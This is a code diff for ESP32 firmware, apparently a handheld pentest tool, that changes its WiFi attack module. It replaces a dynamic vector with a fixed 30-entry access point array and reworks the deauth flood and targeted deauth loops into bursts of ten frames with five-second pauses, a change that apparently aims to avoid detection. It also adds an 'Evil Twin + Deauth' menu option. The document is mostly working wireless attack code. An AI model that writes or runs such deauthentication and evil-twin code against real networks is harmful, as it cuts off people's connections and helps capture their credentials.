@@ -24,7 +24,9 @@
 #define WIFI_ATK_NAME "LeleAttack"
 extern bool showHiddenNetworks;
 
-std::vector<wifi_ap_record_t> ap_records;
+#define MAX_APS 30
+static wifi_ap_record_t ap_records[MAX_APS];
+static int ap_count = 0;
 /**
  * @brief Decomplied function that overrides original one at compilation time.
  *
@@ -311,6 +313,7 @@ void wifi_atk_menu() {
         {"Target Atks",  [&]() { scanAtks = true; }    },
         {"Beacon SPAM",  [=]() { beaconAttack(); }     },
         {"Deauth Flood", [=]() { deauthFloodAttack(); }},
+        {"Evil Twin + Deauth", [=]() { evil_twin_deauth_attack(); }},
     };
     addOptionToMainMenu();
     loopOptions(options);
@@ -322,7 +325,7 @@ void wifi_atk_menu() {
         displayTextLine("Scanning..");
         // include hidden networks in the scan depending on toggle
         nets = WiFi.scanNetworks(false, showHiddenNetworks);
-        ap_records.clear();
+        ap_count = 0;
         options = {};
         for (int i = 0; i < nets; i++) {
             wifi_ap_record_t record;
@@ -343,7 +346,10 @@ void wifi_atk_menu() {
                 record.ssid[0] = '\0';
             }
 
-            ap_records.push_back(record);
+            if (ap_count < MAX_APS) {
+                ap_records[ap_count] = record;
+                ap_count++;
+            }
 
             String ssid = WiFi.SSID(i);
             int encryptionType = WiFi.encryptionType(i);
@@ -395,7 +401,7 @@ ScanNets:
     displayTextLine("Scanning..");
     // include hidden networks in the scan depending on toggle
     nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    ap_records.clear();
+    ap_count = 0;
     for (int i = 0; i < nets; i++) {
         wifi_ap_record_t record;
         memset(&record, 0, sizeof(record));
@@ -408,7 +414,10 @@ ScanNets:
         } else {
             record.ssid[0] = '\0';
         }
-        ap_records.push_back(record);
+        if (ap_count < MAX_APS) {
+            ap_records[ap_count] = record;
+            ap_count++;
+        }
     }
     // Prepare deauth frame for each AP record
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
@@ -419,16 +428,20 @@ ScanNets:
     uint8_t channel = 0;
     drawMainBorderWithTitle("Deauth Flood");
     while (true) {
-        for (const auto &record : ap_records) {
+        for (int i = 0; i < ap_count; i++) {
+            const auto &record = ap_records[i];
             channel = record.primary;
             wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
             tft.setCursor(10, tftHeight - 45);
             tft.println("Channel " + String(record.primary) + "    ");
-            for (int i = 0; i < 100; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-                count += 3;
-                if (EscPress) break;
-            }
+        for (int i = 0; i < 10; i++) {  // Burst de 10 pacotes
+            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            count += 3;
+            if (EscPress) break;
+        }
+        esp_wifi_stop();  // Desliga WiFi após burst
+        vTaskDelay(5000 / portTICK_PERIOD_MS);  // Pausa 5s
+        wifi_atk_setWifi();  // Reativa WiFi
             if (EscPress) break;
         }
         // Update counter every 2 seconds
@@ -475,7 +488,7 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
     ap_record.primary = channel;
 
     String encryptionTypeStr = "Unknown";
-    for (int i = 0; i < ap_records.size(); i++) {
+    for (int i = 0; i < ap_count; i++) {
         if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
             switch (ap_records[i].authmode) {
                 case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
@@ -747,9 +760,15 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             vTaskDelay(50 / portTICK_PERIOD_MS);
             redraw = false;
         }
-        // Send frame
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        count += 3; // the function above sends 3 frames each time
+        // Send burst de 10 frames
+        for (int i = 0; i < 10; i++) {
+            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            count += 3;
+        }
+        esp_wifi_stop(); // Desliga WiFi após burst
+        vTaskDelay(5000 / portTICK_PERIOD_MS); // Pausa 5s
+        wifi_atk_setWifi(); // Reativa WiFi
+
         // atualize counter
         if (millis() - tmp > 2000) {
             tft.setCursor(15, tftHeight - 23);
